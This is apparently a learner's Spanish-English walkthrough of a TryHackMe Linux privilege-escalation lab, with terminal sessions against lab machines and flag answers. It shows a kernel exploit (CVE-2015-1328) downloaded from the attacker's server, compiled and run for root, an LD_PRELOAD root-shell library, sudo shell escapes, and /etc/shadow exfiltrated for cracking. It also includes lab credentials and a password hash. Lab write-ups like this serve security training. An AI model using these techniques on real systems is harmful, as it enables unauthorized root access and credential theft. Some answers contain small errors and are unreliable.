https://tryhackme.com/r/room/linprivesc

## Task 1 Introduction

Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users' passwords are a few key elements that will affect your road to the root shell.  
  
This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.

## Task 2 What is Privilege Escalation?

What does "privilege escalation" mean?

At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.  
  

Why is it important?

It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

- Resetting passwords  
    
- Bypassing access controls to compromise protected data
- Editing software configurations
- Enabling persistence
- Changing the privilege of existing (or new) users
- Execute any administrative command

## Task 3 Enumeration

Note: Launch the target machine attached to this task to follow along.
You can launch the target machine and access it directly from your browser.

Alternatively, you can access it over SSH with the low-privilege user credentials below:  


**Username: karen**
**Password: Password1

Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.

### hostname

The `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).  

### uname -a

Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.  

### /proc/version

The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.

Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

  

### /etc/issue

Systems can also be identified by looking at the `/etc/issue` file. This file usually contains some information about the operating system but can easily be customized or changed. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

### ps Command

The `ps` command is an effective way to see the running processes on a Linux system. Typing `ps` on your terminal will show processes for the current shell.

The output of the `ps` (Process Status) will show the following;

- PID: The process ID (unique to the process)
- TTY: Terminal type used by the user
- Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
- CMD: The command or executable running (will NOT display any command line parameter)

The “ps” command provides a few useful options.

- `ps -A`: View all running processes
- `ps axjf`: View process tree (see the tree formation until `ps axjf` is run below)



- `ps aux`: The `aux` option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.  
    

### env

The `env` command will show environmental variables.z

#### Antes de iniciar cambiamos a un shell mas interactivo

```
ssh karen@10.10.77.167

$ which python
$ bash -i

```

#### Sobre el sistema (hostname, uname -a, /proc/version , /etc/issue, /etc/os-release)
```
karen@wade7363:/home$ pwd
/home
karen@wade7363:/home$ hostname
wade7363
karen@wade7363:/home$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
karen@wade7363:/home$ cat /etc/proc/version
cat: /etc/proc/version: No such file or directory
karen@wade7363:/home$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
karen@wade7363:/home$ cat /etc/issue
Ubuntu 14.04 LTS \n \l

karen@wade7363:/home$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="14.04, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
karen@wade7363:/home$ 
```

#### Comando ps
```
>> todos los procesos

karen@wade7363:/$ ps -A

>> procesos con dependencias

karen@wade7363:/$ ps -axjf

>> procesos para todos los usuarios

karen@wade7363:/$ sud

```

#### env y path
```
karen@wade7363:/$ env

XDG_SESSION_ID=1
SHELL=/bin/sh
TERM=xterm-256color
SSH_CLIENT=10.6.13.236 35410 22
SSH_TTY=/dev/pts/4
USER=karen
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
MAIL=/var/mail/karen
QT_QPA_PLATFORMTHEME=appmenu-qt5
PWD=/
LANG=en_US.UTF-8
SHLVL=1
HOME=/home/karen
LOGNAME=karen
SSH_CONNECTION=10.6.13.236 35410 10.10.77.167 22
XDG_RUNTIME_DIR=/run/user/1001
_=/usr/bin/env
OLDPWD=/home

karen@wade7363:/$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
karen@wade7363:/$ 


```

#### sudo -l

```
karen@wade7363:/$ sudo -l

[sudo] password for karen: 
Sorry, user karen may not run sudo on wade7363.
karen@wade7363:/$ 

```

#### whoami y id

```
karen@wade7363:/$ whoami
karen
karen@wade7363:/$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)
karen@wade7363:/$ 

```

#### /etc/passwd

```
karen@wade7363:/$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
saned:x:108:115::/home/saned:/bin/false
whoopsie:x:109:116::/nonexistent:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
matt:x:1000:1000:matt,,,:/home/matt:/bin/bash
karen:x:1001:1001::/home/karen:
sshd:x:116:65534::/var/run/sshd:/usr/sbin/nologin

>> grep users


cat /etc/passwd | cut -d ":" -f 1
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
libuuid
syslog
messagebus
usbmux
dnsmasq
avahi-autoipd
kernoops
rtkit
saned
whoopsie
speech-dispatcher
avahi
lightdm
colord
hplip
pulse
matt
karen
sshd

>> otra opcion es buscar home

karen@wade7363:/$ cat /etc/passwd | grep home
syslog:x:101:104::/home/syslog:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
saned:x:108:115::/home/saned:/bin/false
matt:x:1000:1000:matt,,,:/home/matt:/bin/bash
karen:x:1001:1001::/home/karen:
```

#### history

```
karen@wade7363:/$ history 

    1  clear
    2  ls -la
    3* 
    4  hostname
    5  uname -a
    6  cat /etc/proc/version
    7  cat /proc/version
    8  cat /etc/issue
    9  cat /etc/os-release 
   10  cd
   11  cd /
   12  ps -A
   13  ps -axjf
   14  ps -aux
   15  ps -aux
   16  stty -a
   17  ps -au
   18  ps -aux
   19  env
   20  echo $PATH
   21  sudo -l
   22  whoami
   23  id
   24  cat /etc/passwd
   25  cat /etc/passwd | cut -d ":" - f 1
   26  cat /etc/passwd | cut -d ":"  -f 1
   27  history 

```

#### ifconfig

```
karen@wade7363:/$ ifconfig 

eth0      Link encap:Ethernet  HWaddr 02:20:22:d7:cf:45  
          inet addr:10.10.77.167  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::20:22ff:fed7:cf45/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:1566 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1242 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:127250 (127.2 KB)  TX bytes:235633 (235.6 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:130 errors:0 dropped:0 overruns:0 frame:0
          TX packets:130 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:9337 (9.3 KB)  TX bytes:9337 (9.3 KB)

```


#### nestat

```
>> Conexiones activas, conexiones tcp, conexiones udp
netstat -a
netstat -at
netstat -au

> listening, statistics, withpid, interfaces
netstat -l
netstat -s
netstat -p
netstat -i

> otros: sockets, no resolve, timers

netstat -a
netstat -n
netstat -o
```

#### find
```

>> several examples


find . -name flag1.txt
find /home -name flag1.txt
find / -type d -name config
find / -type f -perm 0777:


find / -perm a=x
find /home -user frank
find / -mtime 10
find / -atime 10
find / -cmin -60
find / -amin -60
find / -size 50M

>> Folders and files that can be written to or executed from:

find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

>> Find world-executable folders

find / -perm -o x -type d 2>/dev/null

>> Find development tools and supported languages: 

find / -name perl*
find / -name python*
find / -name gcc*

>> find files with the SUID bit, which

find / -perm -u=s -type f 2>/dev/null
```

### General Linux Commands

As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as `find`, `locate`, `grep`, `cut`, `sort`, etc.


### What is the hostname of the target system?
```
karen@wade7363:/home/matt$ hostname

wade7363
```

### What is the Linux kernel version of the target system?

```
karen@wade7363:/home/matt$ uname -a

Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

wade7363 3.13.0-24-generic

```

### What Linux is this?

```
karen@wade7363:/$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="14.04, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"

Ubuntu 14.04 LTS

```

 
### What version of the Python language is installed on the system?

```
karen@wade7363:/home/matt$ which python
/usr/bin/python

karen@wade7363:/home/matt$ which python3
/usr/bin/python3

karen@wade7363:/home/matt$ python --version
Python 2.7.6

karen@wade7363:/home/matt$ python3 --version
Python 3.4.0

karen@wade7363:/home/matt$ python -V
Python 2.7.6

karen@wade7363:/home/matt$ python3 -V
Python 3.4.0


2.7.6

```

### What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)

```

┌──(kali㉿kali)-[~]
└─$ searchsploit Linux Kernel 3.13.0
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
                                                                      | linux/local/41995.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                                              | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                                         | linux/local/37293.txt
                                                                                                    | linux/dos/42932.c
                                                                                                                         | linux/dos/44301.c
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                    
┌──(kali㉿kali)-[~]
└─$  searchsploit -x 37292.c         
  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines (466)


https://www.exploit-db.com/exploits/37292

CVE-2015-1328
```

### Task 4 - Automated Enumeration Tools

- [inPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

```
>> Kali

python3 -m http.server 80                
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.77.167 - - [16/Oct/2024 22:44:06] "GET /linpeas.sh HTTP/1.1" 200 -
127.0.0.1 - - [16/Oct/2024 22:44:59] code 404, message File not found
127.0.0.1 - - [16/Oct/2024 22:44:59] "GET /) HTTP/1.1" 404 -
127.0.0.1 - - [16/Oct/2024 22:44:59] code 404, message File not found
127.0.0.1 - - [16/Oct/2024 22:44:59] "GET /favicon.ico HTTP/1.1" 404 -



>> Victima

karen@wade7363:/tmp$ wget http://10.6.13.236/linpeas.sh

--2024-10-16 23:44:05--  http://10.6.13.236/linpeas.sh
Connecting to 10.6.13.236:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 824745 (805K) [text/x-sh]
Saving to: ‘linpeas.sh’

100%[======================================>] 824,745      757KB/s   in 1.1s   

2024-10-16 23:44:07 (757 KB/s) - ‘linpeas.sh’ saved [824745/824745]

karen@wade7363:/tmp$ chmod +x linpeas.sh 

karen@wade7363:/tmp$ ./linpeas.sh 

```

**LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

```
> Kali


┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ wget  https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh

                                                                                             
┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.77.167 - - [16/Oct/2024 22:48:26] "GET /LinEnum.sh HTTP/1.1" 200 -


> Victima

karen@wade7363:/tmp$ wget http://10.6.13.236/LinEnum.sh
--2024-10-16 23:48:26--  http://10.6.13.236/LinEnum.sh
Connecting to 10.6.13.236:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 367798 (359K) [text/x-sh]
Saving to: ‘LinEnum.sh’

100%[======================================>] 367,798      503KB/s   in 0.7s   

2024-10-16 23:48:27 (503 KB/s) - ‘LinEnum.sh’ saved [367798/367798]

karen@wade7363:/tmp$ chmod +x LinEnum.sh 
karen@wade7363:/tmp$ ./LinEnum.sh 


```


## Task 5 - Privilege Escalation: Kernel Exploits

Note: Launch the target machine attached to this task to follow along.
You can launch the target machine and access it directly from your browser.
Alternatively, you can access it over SSH with the low-privilege user credentials below:
Username: karen
Password: Password1

### find and use the appropriate kernel exploit to gain root privileges on the target system.

```
searchsploit Linux Kernel 3.13.0

searchsploit -m 37292.c

  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines (466)
Copied to: /home/kali/tryhackme/linprivesc/37292.c

> kali

python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.195.207 - - [16/Oct/2024 23:07:40] "GET /37292.c HTTP/1.1" 200 -


> victima

ssh karen@10.10.195.207          
karen@10.10.195.207's password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)
 
$ bash -i
 
karen@wade7363:/$ cd /tmp
karen@wade7363:/tmp$ 
karen@wade7363:/tmp$ wget http://10.6.13.236/37292.c
--2024-10-17 00:07:39--  http://10.6.13.236/37292.c
Connecting to 10.6.13.236:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: ‘37292.c’

100%[===================================================>] 4,968       --.-K/s   in 0s      

2024-10-17 00:07:40 (755 MB/s) - ‘37292.c’ saved [4968/4968]

karen@wade7363:/tmp$ gcc -static 37292.c -o exploit
                                   
                                      
karen@wade7363:/tmp$ chmod +x exploit 
karen@wade7363:/tmp$ ./exploit 

spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
# ls
37292.c  exploit
# cd /root
# ls

# cd /home      
# ls
matt
# cd matt
# cat flag1.txt
```

### What is the content of the flag1.txt file?
```
THM-28392872729920
```

## Task 6 - Privilege Escalation: Sudo

The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the `sudo -l` command.

[https://gtfobins.github.io/](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

### **Leverage application functions**  

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).

Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.

### **Leverage LD_PRELOAD**

On some systems, you may see the LD_PRELOAD environment option.

LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.  

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;
```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}  
```

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

This will result in a shell spawn with root privileges.


### Answer the questions below
#### How many programs can the user "karen" run on the target system with sudo rights?  

```
karen@ip-10-10-132-49:/$ sudo -l
Matching Defaults entries for karen on ip-10-10-132-49:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-132-49:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano


3
```



#### What is the content of the flag2.txt file?  

#### Forma 1

```
sudo less /etc/passwd

!/bin/bash


cd /home
root@ip-10-10-132-49:/home# ls
ubuntu
root@ip-10-10-132-49:/home# cd ubuntu/
root@ip-10-10-132-49:/home/ubuntu# ls
flag2.txt
root@ip-10-10-132-49:/home/ubuntu# cat flag2.txt
THM-402028394
root@ip-10-10-132-49:/home/ubuntu# 


```
#### Forma 2

```
sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /home/ubuntu
# cat flag2.txt
THM-402028394
# 

```


#### How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?  

- vamos al sitio: https://gtfobins.github.io/, y buscamos nmp

```
sudo nmap — interactive
```

#### What is the hash of frank's password?

```
sudo nano /etc/passwd


$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1
```

## Task 7 Privilege Escalation: SUID

Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.  
  
You will notice these files have an “s” bit set showing their special permission level.  
  
`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.

A good practice would be to compare executables on this list with GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/)). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid)).

  The list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.

**Note**: The attached VM has another binary with SUID other than `nano`.  

The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the `/etc/shadow` file or adding our user to `/etc/passwd`.  
  
Below are simple steps using both vectors.  
  
reading the `/etc/shadow` file  
  
We see that the nano text editor has the SUID bit set by running the `find / -type f -perm -04000 -ls 2>/dev/null` command.  
  
`nano /etc/shadow` will print the contents of the `/etc/shadow` file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the `/etc/shadow` and `/etc/passwd` files.

The unshadow tool’s usage can be seen below;  
`unshadow passwd.txt shadow.txt > passwords.txt`


With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext. For a more detailed room on John the Ripper, you can visit [https://tryhackme.com/room/johntheripperbasics](https://tryhackme.com/room/johntheripperbasics).

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

```
openssl passwd -1 -salt THM password1 
$1$THM$WnbwlliCqxFRQepUTCkUT1

```

We will then add this password with a username to the `/etc/passwd` file.

Once our user is added (please note how `root:/bin/bash` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.


Now it's your turn to use the skills you were just taught to find a vulnerable binary.

### Answer the questions below
#### Which user shares the name of a great comic book writer?

```
karen@ip-10-10-38-105:/$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash

gerryconway:x:1001:1001::/home/gerryconway:/bin/sh

user2:x:1002:1002::/home/user2:/bin/sh
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
karen:x:1003:1003::/home/karen:/bin/sh
karen@ip-10-10-38-105:/$ 

gerryconway
```

### What is the password of user2?

#### Buscamos suid
```
karen@ip-10-10-38-105:/$ find / -user root -perm /4000 2>/dev/null
/snap/core/10185/bin/mount
/snap/core/10185/bin/ping
/snap/core/10185/bin/ping6
/snap/core/10185/bin/su
/snap/core/10185/bin/umount
/snap/core/10185/usr/bin/chfn
/snap/core/10185/usr/bin/chsh
/snap/core/10185/usr/bin/gpasswd
/snap/core/10185/usr/bin/newgrp
/snap/core/10185/usr/bin/passwd
/snap/core/10185/usr/bin/sudo
/snap/core/10185/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/10185/usr/lib/openssh/ssh-keysign
/snap/core/10185/usr/lib/snapd/snap-confine
/snap/core/10185/usr/sbin/pppd
/snap/core18/1885/bin/mount
/snap/core18/1885/bin/ping
/snap/core18/1885/bin/su
/snap/core18/1885/bin/umount
/snap/core18/1885/usr/bin/chfn
/snap/core18/1885/usr/bin/chsh
/snap/core18/1885/usr/bin/gpasswd
/snap/core18/1885/usr/bin/newgrp
/snap/core18/1885/usr/bin/passwd
/snap/core18/1885/usr/bin/sudo
/snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1885/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh

/usr/bin/base64

/usr/bin/su
/usr/bin/fusermount
/usr/bin/mount
karen@ip-10-10-38-105:/$ 

```

#### obtenemos shadow y passwd para pasarles el unshadow, los transferimos

```

> victima
> 
karen@ip-10-10-38-105:/$ cd /tmp

karen@ip-10-10-38-105:/tmp$ /bin/base64 /etc/shadow | /bin/base64 -d > shadow
karen@ip-10-10-38-105:/tmp$ cat /etc/passwd > passwd
karen@ip-10-10-38-105:/tmp$ ls
passwd    systemd-private-a3239205556844e1aac2f7de358adad1-systemd-logind.service-ssdEhi
shadow    systemd-private-a3239205556844e1aac2f7de358adad1-systemd-resolved.service-RAjt6i
snap.lxd  systemd-private-a3239205556844e1aac2f7de358adad1-systemd-timesyncd.service-MT96Ze
karen@ip-10-10-38-105:/tmp$ 

karen@ip-10-10-38-105:/tmp$ python3 -m http.server 7070
Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...
10.6.13.236 - - [17/Oct/2024 14:32:42] "GET /shadow HTTP/1.1" 200 -
10.6.13.236 - - [17/Oct/2024 14:32:46] "GET /passwd HTTP/1.1" 200 -


> Kali

wget http://10.10.38.105:7070/passwd

--2024-10-17 09:34:39--  http://10.10.38.105:7070/passwd
Connecting to 10.10.38.105:7070... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1954 (1.9K) [application/octet-stream]
Saving to: ‘passwd’

passwd                 100%[============================>]   1.91K  --.-KB/s    in 0s      

2024-10-17 09:34:39 (173 MB/s) - ‘passwd’ saved [1954/1954]

wget http://10.10.38.105:7070/shadow
--2024-10-17 09:34:43--  http://10.10.38.105:7070/shadow
Connecting to 10.10.38.105:7070... connected.
HTTP request sent, awaiting response... 200 OK
